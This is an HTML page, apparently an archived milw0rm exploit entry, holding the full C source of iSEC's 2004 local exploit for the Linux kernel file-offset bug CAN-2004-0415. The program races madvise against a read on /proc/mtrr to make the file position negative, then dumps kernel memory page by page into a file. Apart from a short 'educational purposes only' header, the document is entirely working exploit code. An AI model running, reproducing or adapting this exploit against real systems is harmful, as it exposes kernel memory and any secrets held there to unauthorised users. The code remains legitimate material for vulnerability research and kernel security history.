<html>
<head>
<title>Linux Kernel File Offset Pointer Handling Memory Disclosure Exploit</title>
<pre>
/*
 * CAN-2004-0415 / gcc -O3 proc_kmem_dump.c -o proc_kmem_dump
 *
 * Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 */


#define _GNU_SOURCE

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;time.h&gt;
#include &lt;sched.h&gt;

#include &lt;sys/socket.h&gt;
#include &lt;sys/select.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/mman.h&gt;

#include &lt;linux/unistd.h&gt;

#include &lt;asm/page.h&gt;


//	define machine mem size in MB
#define MEMSIZE	64



_syscall5(int, _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res,
	  uint, wh);



void fatal(const char *msg)
{
	printf(&quot;\n&quot;);
	if(!errno) {
		fprintf(stderr, &quot;FATAL ERROR: %s\n&quot;, msg);
	}
	else {
		perror(msg);
	}

	printf(&quot;\n&quot;);
	fflush(stdout);
	fflush(stderr);
	exit(31337);
}


static int cpid, nc, fd, pfd, r=0, i=0, csize, fsize=1024*1024*MEMSIZE,
           size=PAGE_SIZE, us;
static volatile int go[2];
static loff_t off;
static char *buf=NULL, *file, child_stack[PAGE_SIZE];
static struct timeval tv1, tv2;
static struct stat st;


//	child close sempahore &amp; sleep
int start_child(void *arg)
{
//	unlock parent &amp; close semaphore
	go[0]=0;
	madvise(file, csize, MADV_DONTNEED);
	madvise(file, csize, MADV_SEQUENTIAL);
	gettimeofday(&amp;tv1, NULL);
	read(pfd, buf, 0);

	go[0]=1;
	r = madvise(file, csize, MADV_WILLNEED);
	if(r)
		fatal(&quot;madvise&quot;);

//	parent blocked on mmap_sem? GOOD!
	if(go[1] == 1 || _llseek(pfd, 0, 0, &amp;off, SEEK_CUR)&lt;0 ) {
		r = _llseek(pfd, 0x7fffffff, 0xffffffff, &amp;off, SEEK_SET);
			if( r == -1 )
				fatal(&quot;lseek&quot;);
		printf(&quot;\n[+] Race won!&quot;); fflush(stdout);
		go[0]=2;
	} else {
		printf(&quot;\n[-] Race lost %d, use another file!\n&quot;, go[1]);
		fflush(stdout);
		kill(getppid(), SIGTERM);
	}
	_exit(1);

return 0;
}


void usage(char *name)
{
	printf(&quot;\nUSAGE: %s &lt;file not in cache&gt;&quot;, name);
	printf(&quot;\n\n&quot;);
	exit(1);
}


int main(int ac, char **av)
{
	if(ac&lt;2)
		usage(av[0]);

//	mmap big file not in cache
	r=stat(av[1], &amp;st);
	if(r)
		fatal(&quot;stat file&quot;);
	csize = (st.st_size + (PAGE_SIZE-1)) &amp; ~(PAGE_SIZE-1);

	fd=open(av[1], O_RDONLY);
	if(fd&lt;0)
		fatal(&quot;open file&quot;);
	file=mmap(NULL, csize, PROT_READ, MAP_SHARED, fd, 0);
	if(file==MAP_FAILED)
		fatal(&quot;mmap&quot;);
	close(fd);
	printf(&quot;\n[+] mmaped uncached file at %p - %p&quot;, file, file+csize);
	fflush(stdout);

	pfd=open(&quot;/proc/mtrr&quot;, O_RDONLY);
	if(pfd&lt;0)
		fatal(&quot;open&quot;);

	fd=open(&quot;kmem.dat&quot;, O_RDWR|O_CREAT|O_TRUNC, 0644);
	if(fd&lt;0)
		fatal(&quot;open data&quot;);

	r=ftruncate(fd, fsize);
	if(r&lt;0)
		fatal(&quot;ftruncate&quot;);

	buf=mmap(NULL, fsize, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if(buf==MAP_FAILED)
		fatal(&quot;mmap&quot;);
	close(fd);
	printf(&quot;\n[+] mmaped kernel data file at %p&quot;, buf);
	fflush(stdout);

//	clone thread wait for child sleep
	nc = nice(0);
	cpid=clone(&amp;start_child, child_stack + sizeof(child_stack)-4,
		   CLONE_FILES|CLONE_VM, NULL);
	nice(19-nc);
	while(go[0]==0) {
		i++;
	}

//	try to read &amp; sleep &amp; move fpos to be negative
	gettimeofday(&amp;tv1, NULL);
	go[1] = 1;
	r = read(pfd, buf, size );
	go[1] = 2;
	gettimeofday(&amp;tv2, NULL);
	if(r&lt;0)
		fatal(&quot;read&quot;);
	while(go[0]!=2) {
		i++;
	}

	us = tv2.tv_sec - tv1.tv_sec;
	us *= 1000000;
	us += (tv2.tv_usec - tv1.tv_usec) ;

	printf(&quot;\n[+] READ %d bytes in %d usec&quot;, r, us); fflush(stdout);
	r = _llseek(pfd, 0, 0, &amp;off, SEEK_CUR);
	if(r &lt; 0 ) {
		printf(&quot;\n[+] SUCCESS, lseek fails, reading kernel mem...\n&quot;);
		fflush(stdout);
		i=0;
		for(;;) {
			r = read(pfd, buf, PAGE_SIZE );
			if(r!=PAGE_SIZE)
				break;
			buf += PAGE_SIZE;
			i++;
			printf(&quot;\r    PAGE %6d&quot;, i); fflush(stdout);
		}
		printf(&quot;\n[+] done, err=%s&quot;, strerror(errno) );
		fflush(stdout);
	}
	close(pfd);

	printf(&quot;\n&quot;);
	sleep(1);
	kill(cpid, 9);

return 0;
}

// milw0rm.com [2004-08-04]
</pre>
</html>

